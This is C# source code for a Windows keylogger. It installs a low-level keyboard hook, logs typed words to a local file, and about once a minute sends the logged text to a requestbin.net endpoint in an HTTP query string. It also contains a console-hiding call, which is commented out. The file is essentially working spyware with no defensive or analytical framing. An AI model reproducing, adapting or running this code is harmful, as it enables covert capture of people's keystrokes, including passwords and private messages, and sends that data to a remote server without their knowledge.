using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Net;

namespace KeyStrk
{
    class Program
    {
        //Stuf used to logg input
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static dataSender ds = new dataSender();
        private static int lastSendTime = DateTime.Now.Minute;
        //Initialize wordData string used to store seprate words from user input
        private static String wordData = "";
   

        public static void Main()
        {
            

            //Create log file if file exists make it blank 
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
            sw.Close();
            
            // Get console
            var handle = GetConsoleWindow();

            // Hide Console 
            //ShowWindow(handle, SW_HIDE);


            //Set up threads
            Thread hookThread = new Thread(HookInput);
            //Thread sendData = new Thread(dSender.checkSend);

            //Start threads
            hookThread.Start();
           // sendData.Start();
           


        }

        private static void HookInput()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Where the loggin happens 
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
             
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                int currentTime = DateTime.Now.Minute;

                if (currentTime - lastSendTime >= 1)
                {
                    ds.send();
                    lastSendTime = DateTime.Now.Minute;
                    //Console.Out.WriteLine("Data sent !");
                }

                // Split the input in to sepate words;
                if ((Keys)vkCode == Keys.Enter || (Keys)vkCode == Keys.Space || (Keys)vkCode == Keys.Oemcomma || (Keys)vkCode == Keys.OemPeriod)
                {
                    StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                    
                    sw.Write(wordData + " ");
                    wordData = "";
                    sw.Close();
                    
                }
                else
                {
                    wordData += (Keys)vkCode;
                }




            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Some dll shit i dont understand 
        /// </summary>
        /// <param name="idHook"></param>
        /// <param name="lpfn"></param>
        /// <param name="hMod"></param>
        /// <param name="dwThreadId"></param>
        /// <returns></returns>

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }

    //Handle sending data to remote location
    class dataSender
    {
        private static int startTime = DateTime.Now.Minute;
        
        //Check if it is time to send 
        public void checkSend()
        {
            while (true)
            {
                //Check if enough time has passed since last sending 
                //set time interval here
                if (DateTime.Now.Minute - startTime == 1)
                {
                    send();
                    startTime = DateTime.Now.Minute;
                    Console.WriteLine("!");
                }
            }
              
              
            
           
        }

        // used for sending data over http request to a remote server
        public void send()
        {
            StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1evrgmf1" + "?" + sr.ReadLine());
            sr.Close();
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
            sw.Close();
            req.GetResponse();
        }

    }


}
